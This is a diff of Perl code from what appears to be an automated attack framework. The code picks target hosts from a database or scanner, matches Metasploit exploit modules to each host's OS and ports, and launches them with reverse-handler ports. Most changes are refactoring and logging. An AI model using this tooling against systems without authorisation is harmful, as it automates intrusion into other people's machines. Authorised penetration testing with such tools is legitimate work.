@@ -125,16 +125,15 @@ sub LaunchExploitOnNode {
             RPORT => $Exploit->RPORT
                 || $Exploit->default_rport,
             LHOST => $Exploit->LHOST
-                || undef
-                ,
-                LPORT=> $self->MSFRPC->{handler_port}
+                || undef,
+            LPORT => $self->MSFRPC->{handler_port}
 
         }
     );
 
     if ( $LaunchResult == 1 ) {
         $self->Init->io->info("Exploit successful...maybe");
-        $self->MSFRPC->handler_port($self->MSFRPC->handler_port+1);
+        $self->MSFRPC->handler_port( $self->MSFRPC->handler_port + 1 );
         return 1;
     }
     return 0;
@@ -159,15 +158,18 @@ sub generate {
 
 sub is_avaible {
     my $self = shift;
+    $self->start() if ( !defined $self->Process );
     while ( $self->Process->is_running ) {
         sleep 5;
-        $self->Init->io->info("waiting for meta and retrying");
+        $self->Init->io->alert("waiting for meta and retrying");
 
         if ( $self->is_up ) {
+            $self->Init->io->info("finally it's up");
+
             last;
         }
         else {
-            $self->Init->io->info("meta doesn't answer yet");
+            $self->Init->io->alert("meta doesn't answer yet");
 
         }
     }
@@ -283,39 +285,47 @@ sub pwn {
     if ($host) {
         my $results = $self->Init->ml->getInstance("Database")
             ->search( { ip => $host } );
-        my $DBHost;
         while ( my $chunk = $results->next ) {
-            for my $foundhost (@$chunk) {
-                push( @Hosts, $foundhost );
-                last;
-            }
+            push( @Hosts, $_ ) for (@$chunk);
         }
+
+        ##At least we try to acquire it thru the scanner, i think that is what you want
+
+        ## execute it's tracked in the history, instead calling the istance
         if ( @Hosts == 0 ) {
-            ##At least we try to acquire it thru the scanner, i think that is what you want
-            $self->Init->ml->execute( "Scanner", "scan", $host )
-                ; ## execute it's tracked in the history, instead calling the istance
+
+            $self->Init->ml->execute( "Scanner", "scan", $host );
+            $results = $self->Init->ml->getInstance("Database")
+                ->search( { ip => $host } );
+            while ( my $chunk = $results->next ) {
+                push( @Hosts, $_ ) for (@$chunk);
+            }
+
         }
+
     }
     else {
         my $results = $self->Init->ml->getInstance("Database")
             ->search( { class => "Resources::Models::Node" } );
-        my $DBHost;
         while ( my $chunk = $results->next ) {
-            for my $foundhost (@$chunk) {
-                push( @Hosts, $foundhost );
-            }
+            push( @Hosts, $_ ) for (@$chunk);
         }
-
     }
     $self->Init->io->info( "Found " . @Hosts . " to attack" );
+    $self->Init->io->info( "=> " . $_->ip . " selected" ) for (@Hosts);
+
     $self->is_avaible;
     foreach my $Node (@Hosts) {
+        $self->Init->io->info( "Attacking " . $Node->ip );
         {
             my $scope = $self->DB->new_scope()
                 ;    #KiokuDB needs that for accessing at attachments
+                my $exploit_n = $Node->attachments->size;
+                my $exploit_launched = 0;
             foreach my $PotentialExploit ( $Node->attachments->members ) {
+                $exploit_launched++;
                 next if !$PotentialExploit->isa("Resources::Models::Exploit");
-                $self->Init->io->info( "Trying "
+                $self->Init->io->info( "[$exploit_launched/$exploit_n] Trying "
                         . $PotentialExploit->module . " on "
                         . $Node->ip );
 
@@ -323,7 +333,8 @@ sub pwn {
                 {
                     ## A successful exploitation
                     $PotentialExploit->successful(1);
-                    $self->Init->ml->getInstance("Database")->update($PotentialExploit);
+                    $self->Init->ml->getInstance("Database")
+                        ->update($PotentialExploit);
 
                 }
             }
@@ -346,16 +357,12 @@ sub matchNode {
             $self->Init->getIO->print_info(
                 "Exploit targets: " . join( "\t", @{ $expl->targets } ) );
             foreach my $target ( @{ $expl->targets } ) {
-                my $os = $Node->os;
-                if ( $Node->os =~ /embedded/ ) {
-                    $os = "linux";
-                }    #it's a good assumption, i know
-                if ( $target =~ /$os/i or $target =~ /Automatic/ ) {
-
-                    #  $self->Init->getIO->print_info("$target match");
-                    $Node->attachments->insert($expl);
-                    last;
-                }
+                my $os
+                    = $Node->os =~ /embedded/
+                    ? "linux"
+                    : $Node->os;    #it's a good assumption, i know
+                $Node->attachments->insert($expl) and last
+                    if ( $target =~ /$os|Automatic/i );
             }
         }
     }
@@ -366,7 +373,7 @@ sub matchPort {
     my $self   = shift;
     my $String = shift;
     my $Objs   = $self->DB->search( { default_rport => $String } );
-    return [] if ( !$Objs );
+    return () if ( !$Objs );
     $self->Init->getIO->print_tabbed(
         "Found " . $Objs->items . " matching exploit for port $String", 3 );
     my @Return;
